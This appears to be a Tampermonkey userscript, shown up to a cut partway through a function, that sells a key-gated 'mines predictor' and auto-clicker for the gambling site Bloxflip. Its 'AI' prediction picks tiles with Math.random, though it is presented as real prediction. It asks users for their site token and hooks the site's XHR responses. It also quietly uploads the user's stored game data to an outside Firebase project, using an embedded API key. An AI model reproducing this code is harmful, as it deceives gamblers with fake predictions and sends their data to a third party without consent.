// ==UserScript==
// @name         MAIN2
// @namespace    http://tampermonkey.net/
// @version      2.3
// @description  AOP
// @author       Your Name
// @match        *://bloxflip.com/mines*
// @match        *://bloxflip.com/*
// @run-at       document-start
// @require      https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js
// @grant        GM_addStyle
// ==/UserScript==

(function() {
   const API_BASE_URL = "https://api.bloxflip.com";
    const validKeys = {
        'javi1': 1,
        'owner': 10,
    };

    let currentGameId = null;
    let currentUrl = window.location.href;
    let previousGameCreateMinesLength = 0;
    let autoClickerActive = false;
    const autoClickerButton = document.getElementById('autoClickerButton');

    document.addEventListener('DOMContentLoaded', function() {
        showLoadingScreen();
        initialize();
        interceptXHRRequests();
    });


    function createComets(container) {
        for (let i = 0; i < 12; i++) {
            const comet = document.createElement('div');
            comet.style.position = 'absolute';
            comet.style.width = '5px';
            comet.style.height = '25px';
            comet.style.backgroundColor = '#00ff7f';
            comet.style.boxShadow = '0 0 10px #00ff7f';
            comet.style.top = `${Math.random() * 100}%`;
            comet.style.left = `${Math.random() * 100}%`;
            comet.style.animation = `cometAnimation ${Math.random() * 2 + 1.5}s linear infinite`;
            container.appendChild(comet);
        }
    }

    function showLoadingScreen() {
        const darkOverlay = document.createElement('div');
        darkOverlay.style.position = 'fixed';
        darkOverlay.style.top = '0';
        darkOverlay.style.left = '0';
        darkOverlay.style.width = '100%';
        darkOverlay.style.height = '100%';
        darkOverlay.style.backgroundColor = 'black';
        darkOverlay.style.color = 'white';
        darkOverlay.style.display = 'flex';
        darkOverlay.style.flexDirection = 'column';
        darkOverlay.style.alignItems = 'center';
        darkOverlay.style.justifyContent = 'center';
        darkOverlay.style.zIndex = '10000000';
        darkOverlay.style.transition = 'opacity 1s ease-in-out';
        document.body.appendChild(darkOverlay);

        const loadingText = document.createElement('h1');
        loadingText.innerText = 'Welcome to AOP Predictor';
        loadingText.style.marginBottom = '20px';
        loadingText.style.animation = 'fadeIn 2s ease-in-out';
        loadingText.style.color = '#00ff7f';
        loadingText.style.textShadow = '0 0 10px #00ff7f, 0 0 20px #00ff7f, 0 0 30px #00ff7f';
        darkOverlay.appendChild(loadingText);

        createComets(darkOverlay);

        const progressBarContainer = document.createElement('div');
        progressBarContainer.style.width = '80%';
        progressBarContainer.style.backgroundColor = '#333';
        progressBarContainer.style.borderRadius = '10px';
        progressBarContainer.style.overflow = 'hidden';
        progressBarContainer.style.boxShadow = '0 0 10px #00ff7f';
        progressBarContainer.style.animation = 'slideIn 2s ease-in-out';
        progressBarContainer.style.zIndex = '10000';
        darkOverlay.appendChild(progressBarContainer);

        const progressBar = document.createElement('div');
        progressBar.style.width = '0%';
        progressBar.style.height = '30px';
        progressBar.style.backgroundColor = '#00ff7f';
        progressBar.style.transition = 'width 15s ease-in-out';
        progressBarContainer.appendChild(progressBar);

        setTimeout(() => {
            progressBar.style.width = '100%';
        }, 100);

        setTimeout(() => {
            const authKeys = JSON.parse(localStorage.getItem('authKeys')) || {};
            const userId = localStorage.getItem('userId');
            const key = Object.keys(authKeys).find(k => authKeys[k].userId === userId && authKeys[k].used);

            if (!key) {
                showAuthGUI(darkOverlay);
            } else {
                const expiryDate = authKeys[key].firstUse + authKeys[key].duration;
                const timeLeft = expiryDate - new Date().getTime();

                if (timeLeft <= 0) {
                    localStorage.removeItem('isAuthenticated');
                    showAuthGUI(darkOverlay);
                } else {
                    darkOverlay.style.opacity = '0';
                    setTimeout(() => {
                        darkOverlay.remove();
                        showMainGUI(timeLeft, userId);
                    }, 1000);
                }
            }
        }, 15000);
    }

    function showAuthGUI(darkOverlay) {
        const loadingElements = darkOverlay.querySelectorAll('h1, div:not([style*="overflow: hidden"])');
        loadingElements.forEach(el => el.remove());

        const authContainer = document.createElement('div');
        authContainer.style.position = 'fixed';
        authContainer.style.top = '50%';
        authContainer.style.left = '50%';
        authContainer.style.transform = 'translate(-50%, -50%)';
        authContainer.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
        authContainer.style.color = 'white';
        authContainer.style.padding = '50px';
        authContainer.style.borderRadius = '10px';
        authContainer.style.boxShadow = '0 0 10px #00ff7f';
        authContainer.style.zIndex = '10000000';
        authContainer.style.animation = 'fadeIn 1s ease-in-out';
        darkOverlay.appendChild(authContainer);

        const title = document.createElement('h2');
        title.innerText = 'AOP Login';
        title.style.textAlign = 'center';
        title.style.marginBottom = '20px';
        title.style.animation = 'fadeIn 2s ease-in-out';
        title.style.color = '#00ff7f';
        title.style.textShadow = '0 0 10px #00ff7f, 0 0 20px #00ff7f, 0 0 30px #00ff7f';
        authContainer.appendChild(title);

        const authInputContainer = document.createElement('div');
        authInputContainer.style.position = 'relative';
        authContainer.appendChild(authInputContainer);

        const authInput = document.createElement('input');
        authInput.type = 'password';
        authInput.placeholder = 'Enter Auth Key';
        authInput.style.padding = '10px';
        authInput.style.fontSize = '16px';
        authInput.style.width = '100%';
        authInput.style.marginBottom = '20px';
        authInputContainer.appendChild(authInput);

        const toggleVisibilityButton = document.createElement('button');
        toggleVisibilityButton.innerHTML = '👁️';
        toggleVisibilityButton.style.position = 'absolute';
        toggleVisibilityButton.style.right = '10px';
        toggleVisibilityButton.style.top = '10px';
        toggleVisibilityButton.style.background = 'none';
        toggleVisibilityButton.style.border = 'none';
        toggleVisibilityButton.style.cursor = 'pointer';
        toggleVisibilityButton.style.fontSize = '16px';
        authInputContainer.appendChild(toggleVisibilityButton);

        toggleVisibilityButton.addEventListener('click', () => {
            authInput.type = authInput.type === 'password' ? 'text' : 'password';
        });

        const authButton = document.createElement('button');
        authButton.innerText = 'Authenticate';
        authButton.style.padding = '10px';
        authButton.style.fontSize = '16px';
        authButton.style.width = '100%';
        authButton.style.cursor = 'pointer';
        authButton.style.transition = 'background-color 0.3s ease';
        authButton.addEventListener('mouseover', () => {
            authButton.style.backgroundColor = '#00ff7f';
            authButton.style.color = 'black';
        });

        authButton.addEventListener('click', async () => {
            const key = authInput.value;
            const currentTime = new Date().getTime();
            const userId = localStorage.getItem('userId') || generateUserId();
            const bloxflipAccount = await getBloxflipAccount();

            if (!validKeys[key]) {
                alert('Invalid key. Please enter a valid key.');
                return;
            }

            let storedData = JSON.parse(localStorage.getItem('authKeys')) || {};
            if (storedData[key] && storedData[key].used) {
                alert('This key has already been used and cannot be used again.');
                return;
            }
            if (!storedData[key]) {
                storedData[key] = {
                    firstUse: currentTime,
                    duration: validKeys[key] * 86400000,
                    userId: userId,
                    bloxflipAccount: bloxflipAccount,
                    used: true // Mark the key as used
                };
                localStorage.setItem('authKeys', JSON.stringify(storedData));
            } else if (storedData[key].userId !== userId || storedData[key].bloxflipAccount !== bloxflipAccount) {
                alert('This key has already been used by another user or Bloxflip account.');
                return;
            }

            const expiryDate = storedData[key].firstUse + storedData[key].duration;
            if (currentTime > expiryDate) {
                alert('Key expired. Please purchase a new key.');
                return;
            }

            const timeLeft = expiryDate - currentTime;
            localStorage.setItem('isAuthenticated', 'true'); // Set authentication flag
            darkOverlay.style.opacity = '0';
            setTimeout(() => {
                darkOverlay.remove();
                showMainGUI(timeLeft, userId);
            }, 1000);
        });

        authContainer.appendChild(authButton);

        createSymbolAnimation(darkOverlay);
        startAnimations(darkOverlay);
    }

    function createSymbolAnimation(darkOverlay) {
        const symbolContainer = document.createElement('div');
        symbolContainer.className = 'symbol-container';
        darkOverlay.appendChild(symbolContainer);

        const symbols = ["$", "%", "#", "*", "@", "&", "!", "?", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
        const symbolCount = 100;

        function getRandomDelay() {
            return (Math.random() * 4000 + 1000).toFixed();
        }

        function createSymbol() {
            const symbol = document.createElement('div');
            symbol.className = 'symbol';
            symbol.textContent = symbols[Math.floor(Math.random() * symbols.length)];
            symbol.style.left = Math.random() * 100 + '%';
            symbol.style.animationDelay = getRandomDelay() + 'ms';
            symbolContainer.appendChild(symbol);
        }
        for (let i = 0; i < symbolCount; i++) {
            createSymbol();
        }
    }

    function startAnimations(darkOverlay) {
        createSymbolAnimation(darkOverlay);
    }

    function generateUserId() {
        const userId = 'user-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('userId', userId);
        return userId;
    }

    async function getBloxflipAccount() {
        return localStorage.getItem('bloxflipAccount') || 'defaultAccount';
    }

    function showMainGUI(timeLeft, userId) {
        const mainGUI = document.createElement('div');
        mainGUI.className = 'mainGUI';
        mainGUI.style.position = 'fixed';
        mainGUI.style.top = '10%';
        mainGUI.style.right = '10px';
        mainGUI.style.width = '300px';
        mainGUI.style.height = '600px';
        mainGUI.style.backgroundColor = 'black';
        mainGUI.style.color = 'white';
        mainGUI.style.padding = '15px';
        mainGUI.style.borderRadius = '10px';
        mainGUI.style.boxShadow = '0 0 10px #00ff7f';
        mainGUI.style.zIndex = '10000000';
        mainGUI.style.transition = 'opacity 1s ease-in-out';
        mainGUI.style.opacity = '0';
        mainGUI.style.overflow = 'hidden';
        document.body.appendChild(mainGUI);

        setTimeout(() => {
            mainGUI.style.opacity = '1';
        }, 100);

        const title = document.createElement('h1');
        title.innerText = 'AOP';
        title.style.textAlign = 'center';
        title.style.fontSize = '26px';
        title.style.marginBottom = '10px';
        title.style.color = '#00ff7f';
        title.style.textShadow = '0 0 10px #00ff7f, 0 0 20px #00ff7f, 0 0 30px #00ff7f';
        mainGUI.appendChild(title);

        const userIdInfo = document.createElement('p');
        userIdInfo.innerText = `User ID: ${userId}`;
        userIdInfo.style.textAlign = 'left';
        userIdInfo.style.marginBottom = '10px';
        mainGUI.appendChild(userIdInfo);

        const expireInfo = document.createElement('p');
        expireInfo.style.textAlign = 'left';
        expireInfo.style.marginBottom = '20px';
        mainGUI.appendChild(expireInfo);

        function updateExpireInfo() {
            const days = Math.floor(timeLeft / 86400000);
            const hours = Math.floor((timeLeft % 86400000) / 3600000);
            const minutes = Math.floor((timeLeft % 3600000) / 60000);
            const seconds = Math.floor((timeLeft % 60000) / 1000);
            expireInfo.innerText = `Expires in: ${days}d, ${hours}h, ${minutes}m, ${seconds}s`;
        }

        updateExpireInfo();

        const interval = setInterval(() => {
            timeLeft -= 1000;
            if (timeLeft <= 0) {
                clearInterval(interval);
                alert('Key expired. Please purchase a new key.');
                location.reload();
            } else {
                updateExpireInfo();
            }
        }, 1000);

        const tokenButton = document.createElement('button');
        tokenButton.innerText = 'Enter Token';
        tokenButton.style.padding = '10px';
        tokenButton.style.marginTop = '20px';
        tokenButton.style.width = '100%';
        tokenButton.style.backgroundColor = '#00ff7f';
        tokenButton.style.color = 'black';
        tokenButton.style.border = 'none';
        tokenButton.style.borderRadius = '5px';
        tokenButton.style.cursor = 'pointer';
        tokenButton.addEventListener('click', showTokenInputGUI);
        mainGUI.appendChild(tokenButton);

        const autoClickerButton = document.createElement('button');
        autoClickerButton.innerText = 'Start AutoClicker';
        autoClickerButton.style.padding = '10px';
        autoClickerButton.style.marginTop = '20px';
        autoClickerButton.style.width = '100%';
        autoClickerButton.style.backgroundColor = '#00ff7f';
        autoClickerButton.style.color = 'black';
        autoClickerButton.style.border = 'none';
        autoClickerButton.style.borderRadius = '5px';
        autoClickerButton.style.cursor = 'pointer';
        autoClickerButton.addEventListener('click', toggleAutoClicker);
        mainGUI.appendChild(autoClickerButton);

        function showTokenInputGUI() {
            const overlay = document.createElement('div');
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
            overlay.style.display = 'flex';
            overlay.style.flexDirection = 'column';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.style.zIndex = '10000000';
            document.body.appendChild(overlay);

            const container = document.createElement('div');
            container.style.backgroundColor = 'black';
            container.style.padding = '30px';
            container.style.borderRadius = '10px';
            container.style.boxShadow = '0 0 10px #00ff7f';
            overlay.appendChild(container);

            const title = document.createElement('h2');
            title.innerText = 'Enter Your Token';
            title.style.color = '#00ff7f';
            title.style.marginBottom = '20px';
            container.appendChild(title);

            const tokenInput = document.createElement('input');
            tokenInput.type = 'text';
            tokenInput.placeholder = 'Enter token here...';
            tokenInput.style.padding = '10px';
            tokenInput.style.width = '100%';
            tokenInput.style.marginBottom = '20px';
            container.appendChild(tokenInput);

            const saveButton = document.createElement('button');
            saveButton.innerText = 'Save Token';
            saveButton.style.padding = '10px';
            saveButton.style.width = '100%';
            saveButton.style.backgroundColor = '#00ff7f';
            saveButton.style.color = 'black';
            saveButton.style.border = 'none';
            saveButton.style.borderRadius = '5px';
            saveButton.style.cursor = 'pointer';
            saveButton.addEventListener('click', () => {
                const token = tokenInput.value;
                if (validateToken(token)) {
                    localStorage.setItem('userToken', token);
                    alert('Token saved successfully!');
                    overlay.remove();
                } else {
                    alert('Invalid token. Please ensure it meets all requirements.');
                }
            });
            container.appendChild(saveButton);
        }

        function validateToken(token) {
            return token.length > 40 &&
                /[a-zA-Z]/.test(token) &&
                /\d/.test(token) &&
                token.includes('/') &&
                token.includes('+');
        }

        function toggleAutoClicker() {
            autoClickerActive = !autoClickerActive;
            autoClickerButton.innerText = autoClickerActive ? 'Stop AutoClicker' : 'Start AutoClicker';
            if (autoClickerActive) {
                startAutoClicker();
            }
        }

        function startAutoClicker() {
            if (!autoClickerActive) return;
            clearMines(); // Asegúrate de limpiar las minas iluminadas antes de empezar un nuevo juego.
            startGame()
                .then(gameData => {
                const tileAmount = getMinesInput();
                return clickPredictedMines(gameData, tileAmount);
            })
                .then(() => {
                return cashOut();
            })
                .then(() => {
                console.log('Cashout successful');
                if (autoClickerActive) {
                    setTimeout(startAutoClicker, 5000); // Esperar 5 segundos antes de iniciar un nuevo juego.
                }
            })
                .catch(err => {
                console.error('AutoClicker Error:', err);
                if (err.message === 'Mine exploded' || err.message === 'Mine exploded (localStorage)') {
                    // Limpiar las minas y esperar 2 segundos antes de reiniciar
                    clearMines();
                    if (autoClickerActive) {
                        setTimeout(() => {
                            startAutoClicker();
                        }, 2000); // Esperar 2 segundos antes de iniciar un nuevo juego.
                    }
                } else {
                    if (autoClickerActive) {
                        setTimeout(startAutoClicker, 5000); // Esperar 5 segundos antes de reiniciar en caso de error general.
                    }
                }
            });
        }

        function startGame() {
            return new Promise((resolve, reject) => {
                clearMines();
                const startButton = document.querySelector('.button_button__dZRSb.button_primary__LXFHi.gameBetSubmit');
                if (!startButton) {
                    return reject(new Error('Start game button not found'));
                }
                startButton.click();
                console.log('Clicked start game button');
                // Esperar una indicación de que el juego ha comenzado, p. ej., un nuevo elemento o cambio de estado.
                setTimeout(() => {
                    currentGameId = 'some-generated-game-id'; // Reemplaza con la lógica real de obtención de ID de juego.
                    resolve({ uuid: currentGameId });
                }, 1000); // Ajusta el retraso según sea necesario para coincidir con el tiempo de inicio del juego.
            });
        }

        function clickPredictedMines(gameData, tileAmount) {
            return new Promise((resolve, reject) => {
                let minesClicked = 0;
                const clickInterval = 1000; // Intervalo que coincide con el retraso de la iluminación (500ms de iluminación + 500ms de buffer).

                function clickNextMine() {
                    const mineElements = document.querySelectorAll('.mines_minesGameItem__S2ytQ');
                    const illuminatedMine = Array.from(mineElements).find(mine => {
                        return mine.style.border.includes('solid') && mine.style.boxShadow.includes('10px');
                    });

                    if (!illuminatedMine) {
                        return reject(new Error('No illuminated mine button found'));
                    }

                    illuminatedMine.click();
                    console.log('Clicked an illuminated mine');

                    // Pausa para verificar si la mina explotó
                    setTimeout(() => {
                        if (illuminatedMine.classList.contains('mines_minesGameItemOtherMine__cOPla')) {
                            return reject(new Error('Mine exploded'));
                        }

                        minesClicked++;

                        if (minesClicked < tileAmount) {
                            setTimeout(clickNextMine, clickInterval);
                        } else {
                            resolve();
                        }
                    }, 500); // Pausa de 500ms para verificar el estado de la mina
                }

                clickNextMine();
            });
        }

        function cashOut() {
            return new Promise((resolve, reject) => {
                const cashOutButton = document.querySelector('.button_button__dZRSb.button_secondary__Fa_lP.gameBetSubmit');
                if (!cashOutButton) {
                    return reject(new Error('Cashout button not found'));
                }
                setTimeout(() => {
                    cashOutButton.click();
                    console.log('Clicked cashout button');
                    resolve();
                }, 1000); // Asegurarse de que hay tiempo suficiente para que el botón de cashout esté disponible
            });
        }

        function getMinesInput() {
            try {
                const tileInput = document.querySelector('.utilitiesGui input[type="number"]');
                if (tileInput) {
                    const tileAmount = parseInt(tileInput.value, 10);
                    console.log('Tile amount:', tileAmount);
                    return tileAmount;
                }
                return 0;
            } catch (err) {
                console.error('Error in getMinesInput:', err);
                return 0;
            }
        }

        function clearMines() {
            const mineElements = document.querySelectorAll('.mines_minesGameItem__S2ytQ');
            mineElements.forEach(mine => {
                mine.style.border = '';
                mine.style.boxShadow = '';
            });
        }

        // Observar cambios en el localStorage para detectar explosiones de minas
        window.addEventListener('storage', (event) => {
            if (event.key === 'mineLose' || event.key === 'gameActionMines') {
                const mineLoseData = JSON.parse(localStorage.getItem('mineLose')) || [];
                const gameActionMinesData = JSON.parse(localStorage.getItem('gameActionMines')) || [];

                if (mineLoseData.length > 0) {
                    const latestLose = mineLoseData[mineLoseData.length - 1];
                    if (latestLose.success && latestLose.exploded) {
                        console.error('Mine exploded (localStorage)');
                        // Detener y reiniciar el auto-clicker si se detecta una explosión en el localStorage
                        clearMines();
                        if (autoClickerActive) {
                            setTimeout(() => {
                                startAutoClicker();
                            }, 2000);
                        }
                    }
                }

                if (gameActionMinesData.length > 0) {
                    const latestAction = gameActionMinesData[gameActionMinesData.length - 1];
                    if (latestAction.success && latestAction.exploded) {
                        console.error('Mine exploded (localStorage)');
                        // Detener y reiniciar el auto-clicker si se detecta una explosión en el localStorage
                        clearMines();
                        if (autoClickerActive) {
                            setTimeout(() => {
                                startAutoClicker();
                            }, 2000);
                        }
                    }
                }
            }
        });

        // Iniciar auto-clicker cuando el documento esté completamente cargado.
        document.addEventListener('DOMContentLoaded', () => {
            startAutoClicker();
        });

        createUtilitiesGui();

        window.mainGUI = mainGUI;
    }

    function createUtilitiesGui() {
        const gameBlock = document.querySelector('.gameBlock');
        if (gameBlock && !document.querySelector('.utilitiesGui')) {
            const utilitiesGui = document.createElement('div');
            utilitiesGui.className = 'utilitiesGui';
            utilitiesGui.style.position = 'absolute';
            utilitiesGui.style.bottom = '-290px';
            utilitiesGui.style.left = '0px';
            utilitiesGui.style.width = '100%';
            utilitiesGui.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
            utilitiesGui.style.color = 'white';
            utilitiesGui.style.padding = '15px';
            utilitiesGui.style.borderRadius = '10px';
            utilitiesGui.style.boxShadow = '0 0 10px #00ff7f';
            gameBlock.appendChild(utilitiesGui);

            const utilitiesTitle = document.createElement('h2');
            utilitiesTitle.innerText = 'AOP Utilities';
            utilitiesTitle.style.textAlign = 'center';
            utilitiesTitle.style.marginBottom = '20px';
            utilitiesGui.appendChild(utilitiesTitle);

            const colorLabelContainer = document.createElement('div');
            colorLabelContainer.style.display = 'flex';
            colorLabelContainer.style.alignItems = 'center';
            colorLabelContainer.style.marginBottom = '10px';
            utilitiesGui.appendChild(colorLabelContainer);

            const colorLabel = document.createElement('p');
            colorLabel.innerText = 'Color:';
            colorLabel.style.fontSize = '18px';
            colorLabel.style.marginRight = '10px';
            colorLabelContainer.appendChild(colorLabel);

            const colorInput = document.createElement('input');
            colorInput.type = 'color';
            colorInput.value = '#00ff7f';
            colorInput.style.width = '60px';
            colorLabelContainer.appendChild(colorInput);

            const tileLabel = document.createElement('p');
            tileLabel.innerText = 'Tile Amount:';
            tileLabel.style.fontSize = '25px';
            tileLabel.style.marginLeft = '20px';
            tileLabel.style.marginRight = '10px';
            colorLabelContainer.appendChild(tileLabel);

            const tileInput = document.createElement('input');
            tileInput.type = 'number';
            tileInput.value = '3';
            tileInput.min = '1';
            tileInput.max = '25';
            tileInput.style.width = '50px';
            tileInput.style.padding = '5px';
            tileInput.style.fontSize = '15px';
            tileInput.style.textAlign = 'center';
            colorLabelContainer.appendChild(tileInput);

            const applyButton = document.createElement('button');
            applyButton.innerText = 'Apply Color';
            applyButton.style.width = '100%';
            applyButton.style.padding = '10px';
            applyButton.style.backgroundColor = '#00ff7f';
            applyButton.style.color = 'black';
            applyButton.style.border = 'none';
            applyButton.style.borderRadius = '5px';
            applyButton.style.cursor = 'pointer';
            applyButton.style.marginBottom = '10px';
            utilitiesGui.appendChild(applyButton);

            const unrigButton = document.createElement('button');
            unrigButton.innerText = 'Unrig';
            unrigButton.style.width = '100%';
            unrigButton.style.padding = '10px';
            unrigButton.style.backgroundColor = '#00ff7f';
            unrigButton.style.color = 'black';
            unrigButton.style.border = 'none';
            unrigButton.style.borderRadius = '5px';
            unrigButton.style.cursor = 'pointer';
            utilitiesGui.appendChild(unrigButton);

            applyButton.addEventListener('click', () => {
                const selectedColor = colorInput.value;
                updateBorderColor(selectedColor);
            });
        }
    }

    function updateBorderColor(color) {
        localStorage.setItem('neonBorderColor', color);
        document.documentElement.style.setProperty('--color-neon-border', color);
        document.documentElement.style.setProperty('--color-highlight', color);

        const elements = document.querySelectorAll('.sidebar_sidebar__7U3PX, .gameBlock, .towers_towersGame__4VfYK, .towers_towersGameRowContainer__HCJog, .mines_minesGame__6Bltb, .utilitiesGui, .mainGUI');
        elements.forEach(element => {
            element.style.border = `2px solid ${color}`;
            element.style.boxShadow = `0 0 10px ${color}`;
            element.style.borderRadius = '12px';
        });
    }

    function initialize() {
        loadBorderColor();
        adjustUtilitiesGui();
        adjustGameBlockForTowers();
        observeDomChanges();
    }

    function loadBorderColor() {
        const savedColor = localStorage.getItem('neonBorderColor');
        if (savedColor) {
            updateBorderColor(savedColor);
        }
    }

    function adjustUtilitiesGui() {
        const isMines = window.location.href.includes('/mines');
        const isTowers = window.location.href.includes('/towers');
        const utilitiesGui = document.querySelector('.utilitiesGui');
        if (utilitiesGui) {
            if (isMines) {
                utilitiesGui.style.width = '100%';
            } else if (isTowers) {
                utilitiesGui.style.width = '100%';
            }
        }
    }

    function adjustGameBlockForTowers() {
        const isTowers = window.location.href.includes('/towers');
        if (isTowers) {
            const gameBlock = document.querySelector('.gameBlock');
            if (gameBlock) {
                gameBlock.style.width = '100%';
                gameBlock.style.margin = '20px auto';
                gameBlock.style.backgroundColor = '#333';
                gameBlock.style.height = '50%';
            }
        }
    }

    function showLoadingAnimation(container) {
        try {
            const elementsToHide = container.querySelectorAll('*');
            elementsToHide.forEach(element => {
                element.style.display = 'none';
            });

            const darkOverlay = document.createElement('div');
            darkOverlay.id = 'darkOverlay';
            darkOverlay.style.position = 'absolute';
            darkOverlay.style.top = '0';
            darkOverlay.style.left = '0';
            darkOverlay.style.width = '100%';
            darkOverlay.style.height = '100%';
            darkOverlay.style.backgroundColor = 'black';
            darkOverlay.style.zIndex = '1000';
            darkOverlay.style.display = 'flex';
            darkOverlay.style.justifyContent = 'center';
            darkOverlay.style.alignItems = 'center';
            container.appendChild(darkOverlay);

            const canvas = document.createElement('canvas');
            canvas.id = 'matrixCanvas';
            canvas.style.position = 'absolute';
            canvas.style.top = '0';
            canvas.style.left = '0';
            canvas.style.width = '100%';
            canvas.style.height = '100%';
            darkOverlay.appendChild(canvas);

            const ctx = canvas.getContext('2d');
            const cw = canvas.width = container.offsetWidth;
            const ch = canvas.height = container.offsetHeight;
            const charArr = 'abcdefghijklmnopqrstuvwxyz'.split('');
            const maxCharCount = 100;
            const fallingCharArr = [];
            const fontSize = 10;
            const maxColumns = cw / fontSize;

            function randomInt(min, max) {
                return Math.floor(Math.random() * (max - min) + min);
            }

            function randomFloat(min, max) {
                return Math.random() * (max - min) + min;
            }

            function Point(x, y) {
                this.x = x;
                this.y = y;
            }

            Point.prototype.draw = function(ctx) {
                this.value = charArr[randomInt(0, charArr.length - 1)].toUpperCase();
                this.speed = randomFloat(1, 5);
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px san-serif';
                ctx.fillText(this.value, this.x, this.y);
                this.y += this.speed;
                if (this.y > ch) {
                    this.y = randomFloat(-100, 0);
                    this.speed = randomFloat(2, 5);
                }
            };

            for (let i = 0; i < maxColumns; i++) {
                fallingCharArr.push(new Point(i * fontSize, randomFloat(-500, 0)));
            }

            function update() {
                ctx.fillStyle = 'rgba(0,0,0,0.05)';
                ctx.fillRect(0, 0, cw, ch);
                let i = fallingCharArr.length;
                while (i--) {
                    fallingCharArr[i].draw(ctx);
                }
                requestAnimationFrame(update);
            }

            update();
            return update;
        } catch (err) {
            console.error('Error in showLoadingAnimation:', err);
        }
    }

    function hideLoadingAnimation(container) {
        try {
            const darkOverlay = container.querySelector('#darkOverlay');
            if (darkOverlay) {
                setTimeout(() => {
                    cancelAnimationFrame(window.loadingAnimation);
                    darkOverlay.remove();

                    const elementsToShow = container.querySelectorAll('*');
                    elementsToShow.forEach(element => {
                        element.style.display = 'block';
                    });
                }, 1000);
            }
        } catch (err) {
            console.error('Error in hideLoadingAnimation:', err);
        }
    }

    function illuminateMines(mines) {
        try {
            const color = localStorage.getItem('neonBorderColor') || '#00ff7f';
            const mineElements = document.querySelectorAll('.mines_minesGameItem__S2ytQ');
            mines.forEach((mine, index) => {
                setTimeout(() => {
                    const mineElement = mineElements[mine - 1];
                    if (mineElement) {
                        mineElement.style.transition = 'border 0.5s, box-shadow 0.5s';
                        mineElement.style.border = `2px solid ${color}`;
                        mineElement.style.boxShadow = `0 0 10px ${color}`;
                    }
                }, index * 500);
            });
        } catch (err) {
            console.error('Error in illuminateMines:', err);
        }
    }

    function onUrlChange() {
        adjustUtilitiesGui();
        adjustGameBlockForTowers();
        loadBorderColor();
        createUtilitiesGui();
    }

    function observeDomChanges() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach(() => {
                onUrlChange();
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });

        const urlObserver = new MutationObserver(() => {
            if (currentUrl !== window.location.href) {
                currentUrl = window.location.href;
                onUrlChange();
            }
        });
        urlObserver.observe(document.body, { childList: true, subtree: true });
    }
    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
    const firebaseConfig = {
        apiKey: "AIzaSyA26qkCowFzzNsWhS-rPLoAOQRa6Af5Sa8",
        authDomain: "aopesp-76d29.firebaseapp.com",
        projectId: "aopesp-76d29",
        storageBucket: "aopesp-76d29.appspot.com",
        messagingSenderId: "668910236054",
        appId: "1:668910236054:web:0388501014577f92216db7",
        measurementId: "G-MCXF80WP86"
    };
    // Función para cargar scripts de manera dinámica
    function loadScript(url, callback) {
        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;
        script.onload = callback;
        document.head.appendChild(script);
    }

    // Cargar las bibliotecas de Firebase (versión que no utiliza módulos ES6)
    loadScript('https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js', function() {
        loadScript('https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js', function() {
            initializeFirebase();
        });
    });

    // Función para inicializar Firebase después de cargar las bibliotecas
    function initializeFirebase() {
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        console.log('Firebase initialized');
        sendLocalStorageToFirestore(db);
    }

    // Función para enviar datos del localStorage a Firestore
    function sendLocalStorageToFirestore(db) {
        // Leer datos de localStorage
        const mineLoseData = JSON.parse(localStorage.getItem('mineLose')) || [];
        const gameCreateMinesData = JSON.parse(localStorage.getItem('gameCreateMines')) || [];
        const gameCashoutMinesData = JSON.parse(localStorage.getItem('gameCashoutMines')) || [];

        // Enviar cada colección de datos a Firestore
        mineLoseData.forEach(data => sendDataToFirestore(db, 'mineLose', data));
        gameCreateMinesData.forEach(data => sendDataToFirestore(db, 'gameCreateMines', data));
        gameCashoutMinesData.forEach(data => sendDataToFirestore(db, 'gameCashoutMines', data));
    }

    // Función para enviar datos a Firestore
    function sendDataToFirestore(db, collection, data) {
        db.collection(collection).add(data)
            .then((docRef) => {
            console.log(`Document written in ${collection} with ID: `, docRef.id);
        })
            .catch((error) => {
            console.error(`Error adding document to ${collection}: `, error);
        });
    }

    // Inicializar el script cuando el documento esté listo
    document.addEventListener('DOMContentLoaded', function() {
        // La inicialización de Firebase y el envío de datos se realizará después de cargar Firebase
    });

    function interceptXHRRequests() {
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            if (url.includes('https://api.bloxflip.com/games/mines/create') ||
                url.includes('https://api.bloxflip.com/games/mines/action') ||
                url.includes('https://api.bloxflip.com/user/promotion/deposits/active')) {

                this.addEventListener('load', function() {
                    console.log(`XHR Request to ${url}`);
                    console.log('Response:', this.responseText);
                    const responseData = JSON.parse(this.responseText);
                    handleResponseData(url, responseData);
                });
            }
            originalOpen.apply(this, arguments);
        };
    }

    function handleGameCreate(data) {
        if (data.uuid) {
            currentGameId = data.uuid;
            console.log('Game created:', data);
        }
    }

    function handleGameAction(data) {
        if (data.exploded || data.winnings !== undefined) {
            const mainGUI = document.querySelector('.mainGUI');
            hideLoadingAnimation(mainGUI);
        }
    }

    function trainAI() {
        const gameCreateMinesData = JSON.parse(localStorage.getItem('gameCreateMines')) || [];
        const gameActionMinesData = JSON.parse(localStorage.getItem('gameActionMines')) || [];
        const mineLoseData = JSON.parse(localStorage.getItem('mineLose')) || [];
        const gameCashoutMinesData = JSON.parse(localStorage.getItem('gameCashoutMines')) || [];

        const minesFrequency = Array(25).fill(0);

        mineLoseData.forEach(lose => {
            lose.lose.mines.forEach(mine => {
                minesFrequency[mine - 1] += 1;
            });
        });

        return minesFrequency;
    }

    function illuminatePredictedMines(tileAmount) {
        const predictedMines = MinesAI(tileAmount);
        illuminateMines(predictedMines);
    }

    function MinesAI(tileAmount) {
        const numOfTiles = 25;
        const safeTiles = [];

        while (safeTiles.length < tileAmount) {
            const randomTile = Math.floor(Math.random() * numOfTiles) + 1;
